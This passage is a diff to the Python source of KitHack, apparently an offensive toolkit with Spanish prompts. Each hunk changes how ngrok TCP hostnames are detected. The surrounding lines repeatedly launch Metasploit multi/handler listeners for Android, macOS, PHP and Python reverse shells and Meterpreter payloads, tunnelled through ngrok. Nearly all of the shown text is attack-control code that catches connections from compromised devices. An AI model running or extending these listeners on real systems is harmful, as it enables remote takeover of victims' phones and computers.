 								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
 								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2110,8 +2079,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2167,8 +2135,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2250,8 +2217,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2282,8 +2248,7 @@ def options():
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
 						else:
-							lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-							if LHOST not in lista:
+							if not ".tcp.ngrok.io" in LHOST:
 								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2326,8 +2291,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2383,8 +2347,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2466,8 +2429,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2498,8 +2460,7 @@ def options():
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
 						else:
-							lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-							if LHOST not in lista:
+							if not ".tcp.ngrok.io" in LHOST:
 								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2542,8 +2503,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2599,8 +2559,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2682,8 +2641,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2714,8 +2672,7 @@ def options():
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
 						else:
-							lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-							if LHOST not in lista:
+							if not ".tcp.ngrok.io" in LHOST:
 								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
 								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2758,8 +2715,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2815,8 +2771,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()								
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2898,8 +2853,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2930,8 +2884,7 @@ def options():
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
 						else:
-							lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-							if LHOST not in lista:
+							if not ".tcp.ngrok.io" in LHOST:
 								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
 								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -2974,8 +2927,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3031,8 +2983,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3114,8 +3065,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3146,8 +3096,7 @@ def options():
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
 						else:
-							lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-							if LHOST not in lista:
+							if not ".tcp.ngrok.io" in LHOST:
 								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3190,8 +3139,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3247,8 +3195,7 @@ def options():
 								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 								banner(), menu(), options()	
 							else:
-								lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-								if LHOST not in lista:
+								if not ".tcp.ngrok.io" in LHOST:
 									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3314,8 +3261,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3348,8 +3294,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3382,8 +3327,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3416,8 +3360,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3450,8 +3393,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3484,8 +3426,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x86/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3532,8 +3473,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3566,8 +3506,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3600,8 +3539,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/reverse_php; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
@@ -3653,8 +3591,7 @@ def options():
 						os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						lista = ["0.tcp.ngrok.io", "1.tcp.ngrok.io", "2.tcp.ngrok.io", "3.tcp.ngrok.io", "4.tcp.ngrok.io", "5.tcp.ngrok.io", "6.tcp.ngrok.io", "7.tcp.ngrok.io,", "8.tcp.ngrok.io", "9.tcp.ngrok.io"]
-						if LHOST not in lista:
+						if not ".tcp.ngrok.io" in LHOST:
 							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
